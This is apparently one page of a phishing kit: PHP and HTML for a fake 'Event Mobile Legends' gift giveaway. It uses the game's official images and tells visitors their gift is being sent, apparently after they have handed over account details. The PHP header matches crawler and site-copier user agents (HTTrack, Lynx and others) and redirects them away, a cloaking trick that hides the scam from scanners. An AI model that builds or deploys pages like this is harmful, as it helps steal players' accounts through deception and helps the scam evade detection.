<?php 
session_start();

$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/IdhamDotID');
die();
}

if(!isset($_SESSION['nickname'])) {
    header('location: ');
}
?>
<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
        <link rel="stylesheet" href="static/css/style.css">
        <title>Event Mobile Legends</title>
        <link rel="shorcut icon" href="https://pht.qoo-static.com/VObo_efVQ255Uny-K5k6EEMxQ9PQYk6PFNSReWDQxKf19HiXBH8BbluIzH1e43iQiw=w512">
    </head>
    <body>
        <div class="mobile">
            <div class="navbar">
                <img src="https://pht.qoo-static.com/VObo_efVQ255Uny-K5k6EEMxQ9PQYk6PFNSReWDQxKf19HiXBH8BbluIzH1e43iQiw=w512">
                <div class="text-left text-white text-header">
                    MOBILE LEGENDS<br>
                    <span>Success</span>
                </div>
            </div>
            <div class="row">
                <div class="col-md-12 col-12">
                    <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
                        <ol class="carousel-indicators">
                            <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
                            <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
                            <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>
                        </ol>
                        <div class="carousel-inner">
                            <div class="carousel-item active">
                                <img src="https://img.mobilelegends.com/group1/M00/00/A8/Cq2Ixl8ZituAGwarAAHNfBPOsM4083.jpg?width=572&amp;height=269" class="d-block w-100" alt="...">
                            </div>
                            <div class="carousel-item">
                                <img src="https://img.mobilelegends.com/group1/M00/00/A7/Cq2Ixl7wGPWAJCbAAAbgbX3e8kE591.png?width=572&amp;height=269" class="d-block w-100" alt="...">
                            </div>
                            <div class="carousel-item">
                                <img src="https://img.mobilelegends.com/group1/M00/00/A5/Cq2Ixl7fLJyAfML4AAFpcdTwiIo390.jpg?width=572&amp;height=269" class="d-block w-100" alt="...">
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="row mt-1 mb-1">
                <div class="col-md-12 col-12">
                    <div class="clearfix"></div>
                </div>
            </div>

            <div class="row mt-4 d-block mx-auto">
                <div class="col-md-12 col-12 mb-4 text-white text-center" style="font-size: 0.8em;">
                    Congratulations <p>Your gift is in the process of being sent, Thank you.</p>
                </div>
                <div class="col-md-12 col-12">
                    <button class="btn btn-primary text-left" onclick="location.href='./'"> <i class="zmdi zmdi-shield-check" style="font-size: 2.9em;"></i> <div class="txtLogin2">Logout</div></button>
                </div>
            </div>

            <div class="mb-3"></div>
        </div>

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
        <script src="static/js/index.js"></script>
    </body>
</html>